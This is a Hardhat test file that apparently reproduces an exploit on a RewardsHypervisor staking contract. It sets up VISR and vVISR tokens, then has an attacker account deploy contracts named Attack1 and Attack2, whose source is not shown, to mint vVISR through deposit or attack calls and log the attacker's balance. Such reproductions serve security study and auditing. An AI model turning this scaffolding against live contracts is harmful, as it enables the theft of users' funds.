/** @format */

const { ethers } = require('hardhat');

describe('Exploit', async () => {
  let visr, vVisr, rewardsHypervisor;
  let admin, attacker;

  beforeEach(async () => {
    [admin, attacker] = await ethers.getSigners();

    let VISR = await ethers.getContractFactory('VISR');
    visr = await VISR.connect(admin).deploy('VISOR', 'VISR');

    let vVISR = await ethers.getContractFactory('vVISR');
    vVisr = await vVISR.connect(admin).deploy('vVISOR', 'VVISR', 18);

    let RewardsHypervisor = await ethers.getContractFactory('RewardsHypervisor');
    rewardsHypervisor = await RewardsHypervisor.connect(admin).deploy(visr.address, vVisr.address);

    await vVisr.connect(admin).transferOwnership(rewardsHypervisor.address);
  });

  it('Exploit 1', async () => {
    let Attack = await ethers.getContractFactory('Attack1');

    let attack = await Attack.connect(attacker).deploy(rewardsHypervisor.address);

    await rewardsHypervisor.connect(attacker).deposit(1000, attack.address, attacker.address);

    console.log(parseInt(await vVisr.balanceOf(attacker.address)));
  });

  it('Exploit 2', async () => {
    let Attack = await ethers.getContractFactory('Attack2');

    let attack = await Attack.connect(attacker).deploy(rewardsHypervisor.address);

    await attack.connect(attacker).transferOwnership(attack.address);

    await attack.connect(attacker).attack(1000);

    console.log(parseInt(await vVisr.balanceOf(attacker.address)));
  });
});
